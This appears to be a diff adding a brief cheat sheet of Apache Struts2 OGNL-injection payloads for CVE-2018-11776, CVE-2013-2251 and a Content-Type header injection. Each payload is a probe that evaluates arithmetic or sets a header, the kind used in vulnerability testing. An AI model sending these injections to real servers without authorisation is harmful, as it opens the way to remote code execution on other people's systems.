@@ -1,0 +1,11 @@
+#payload from internet #notmine
+Apache-Struts2 Exploit Payload - Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack-dr4gonw4ll-POC',4*4)}.multipart/form-data
+
+
+Struts2 Remote Code Execution vulnerability CVE-2018-11776 - ${3+2} 
+Payload format - http://localhost:8080/${3+2}/date.action - Results 5 in Response location header 
+
+
+CVE-2013-2251
+Payload - http://host/struts2-blank/example/X.action?action:%25{3*4}
+          http://host/struts2-showcase/employee/save.action?redirect:%25{3*4}
